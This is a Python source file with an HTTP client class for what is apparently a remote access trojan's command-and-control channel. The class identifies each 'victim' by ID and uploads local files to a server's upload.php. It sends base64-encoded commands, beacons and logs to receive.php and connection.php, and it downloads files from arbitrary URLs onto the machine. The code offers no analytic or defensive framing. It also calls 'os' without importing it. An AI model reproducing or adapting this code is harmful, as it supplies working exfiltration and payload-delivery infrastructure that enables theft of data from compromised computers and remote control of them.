import requests, base64

class HTTPSocket:
    def __init__(self, host, victim_id):
        self.host = host
        self.victim_id = victim_id

    def _GET(self, filename, request_params):
        # Use params for GET requests, and handle potential errors in the caller
        requests.get(url=self.host + filename, params=request_params, timeout=15)

    def _POST(self, filename, request_data):
        # Use data for POST requests, and handle potential errors in the caller
        requests.post(url=self.host + filename, data=request_data, timeout=15)

    def Upload(self, filepath):
        url = self.host + "upload.php"
        # Ensure the file exists before attempting to open and upload
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"File to upload not found: {filepath}")
            
        with open(filepath, 'rb') as f:
            files = {'file': f}
            victim_id_param = { 'id' : base64.b64encode(self.victim_id.encode('UTF-8'))}
            requests.post(url, files=files, params=victim_id_param, timeout=30) # Increased timeout for uploads

    def Connect(self, clientdata):
        # No need to encode clientdata in base64 again if it's already done or will be done by server
        # Assuming clientdata is already prepared for the server
        payload = { 'data': base64.b64encode(clientdata.encode('UTF-8')) } 
        self._GET("connection.php", payload)        

    def Send(self,command):
        payload = {'command': base64.b64encode(command.encode('UTF-8')), 'vicID': base64.b64encode(self.victim_id.encode('UTF-8'))}
        self._GET("receive.php", payload)
 
    def Log(self, type, message):
        # Encode type and message for consistency, assuming server expects base64
        encoded_type = base64.b64encode(type.encode('UTF-8')).decode('UTF-8')
        encoded_message = base64.b64encode(message.encode('UTF-8')).decode('UTF-8')
        self.Send(f"NewLog|BN|{encoded_type}|BN|{encoded_message}")
        
    def Download(self, url, destinationPath):
        response = requests.get(url, timeout=30, stream=True) # Use stream=True for large files
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        with open(destinationPath, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192): # Iterate over response in chunks
                f.write(chunk)
